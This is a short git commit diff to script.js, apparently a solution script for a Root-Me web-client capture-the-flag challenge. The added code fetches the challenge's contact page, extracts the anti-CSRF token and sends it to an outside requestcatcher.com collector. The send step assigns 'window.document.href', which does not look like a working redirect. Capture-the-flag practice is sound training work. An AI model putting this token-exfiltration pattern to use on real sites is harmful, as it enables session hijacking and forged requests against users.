6e7fafd4df8e10bac356b0f94cb30423037f406e
fullgitstack <mackormack0@gmail.com>
2025-10-02 22:00:18 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,12 @@
 const fn = async () => {
+const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact');
+const resp = await req.text();
 
+const parser = new DOMParser();
+const doc = parser.parseFromString(resp, "text/html");
+const token = doc.querySelector('#token').value;
 
-fetch(`https://tyyhty.requestcatcher.com/hello3`)
+window.document.href = `https://tyyhty.requestcatcher.com/${token}`;
 
 
 
